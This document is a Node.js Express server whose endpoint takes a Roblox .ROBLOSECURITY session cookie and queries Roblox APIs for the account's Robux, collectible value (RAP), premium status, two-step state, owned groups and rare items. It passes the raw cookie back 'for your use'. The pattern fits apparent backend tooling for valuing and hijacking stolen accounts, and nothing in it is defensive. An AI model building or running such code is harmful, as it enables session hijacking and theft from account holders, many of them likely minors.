require('dotenv').config();
const express = require('express');
const fetch = require('node-fetch');
const app = express();

app.use(express.json());

// Util: Roblox API call with .ROBLOSECURITY
async function robloxApi(path, cookie) {
  const res = await fetch(`https://www.roblox.com${path}`, {
    headers: {
      'Cookie': `.ROBLOSECURITY=${cookie}`,
      'User-Agent': 'Roblox/WinInet'
    }
  });
  if (!res.ok) throw new Error(`Roblox API error: ${res.status}`);
  return res.json();
}

// Util: Roblox Authenticated API call
async function robloxApiAuth(url, cookie) {
  const res = await fetch(url, {
    headers: {
      'Cookie': `.ROBLOSECURITY=${cookie}`,
      'User-Agent': 'Roblox/WinInet'
    }
  });
  if (!res.ok) throw new Error(`Roblox API error: ${res.status}`);
  return res.json();
}

// Main endpoint: POST /roblox-info
app.post('/roblox-info', async (req, res) => {
  const { cookie } = req.body;
  if (!cookie) return res.status(400).json({ error: "No cookie provided" });

  try {
    // 1. Get profile info
    const userRes = await robloxApiAuth('https://users.roblox.com/v1/users/authenticated', cookie);
    const userId = userRes.id;
    const username = userRes.name;
    const created = userRes.created;
    // 2. Avatar
    const avatar = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`;
    // 3. Account info
    const settingsRes = await robloxApiAuth('https://accountsettings.roblox.com/v1/email', cookie);
    const emailVerified = !!settingsRes.verified;
    // 4. Premium
    let premium = false;
    try {
      const premRes = await robloxApiAuth('https://premiumfeatures.roblox.com/v1/users/' + userId + '/subscriptions', cookie);
      premium = Array.isArray(premRes) && premRes.length > 0;
    } catch { premium = false; }
    // 5. Robux
    let robux = 0;
    try {
      const robuxRes = await robloxApiAuth('https://economy.roblox.com/v1/user/currency', cookie);
      robux = robuxRes.robux;
    } catch { robux = 0; }
    // 6. Groups owned
    let groupsOwned = 0;
    try {
      const groupsRes = await robloxApiAuth('https://groups.roblox.com/v2/users/' + userId + '/groups/roles', cookie);
      groupsOwned = (groupsRes.data || []).filter(g => g.role.rank === 255).length;
    } catch { groupsOwned = 0; }
    // 7. RAP
    let rap = 0;
    try {
      const inventoryRes = await robloxApiAuth(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, cookie);
      rap = (inventoryRes.data || []).reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
    } catch { rap = 0; }
    // 8. 2-Step (Security)
    let twoStepEnabled = false;
    try {
      const securityRes = await robloxApiAuth('https://twostepverification.roblox.com/v1/users/' + userId + '/configuration', cookie);
      twoStepEnabled = !!securityRes.enabled;
    } catch { twoStepEnabled = false; }
    // 9. Location (simulate with "N/A")
    let accountCountry = "N/A";
    // 10. Games played: MM2, Grow a Garden, and Gamepasses
    // These require scraping or more API, so simulate for now
    let playedMM2 = false, mm2Gamepasses = "", playedGrowAGarden = false, gagGamepasses = "";
    // 11. Korblox, Headless, Credit, Convert, Payments, summary (simulate)
    let korblox = false, headless = false, credit = 0, convert = 0, payments = 0, summary = "";

    // 12. Account age
    const accountAge = Math.floor((Date.now() - new Date(created)) / (1000*60*60*24));

    // Respond with all info
    res.json({
      username,
      userId,
      avatar,
      accountCountry,
      accountAge,
      created,
      robux,
      premium,
      twoStepEnabled,
      emailVerified,
      groupsOwned,
      rap,
      summary,
      credit,
      convert,
      payments,
      korblox,
      headless,
      playedMM2,
      mm2Gamepasses,
      playedGrowAGarden,
      gagGamepasses,
      cookie // include ONLY if you want for your use, not for the front-end!
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('API running on port', PORT));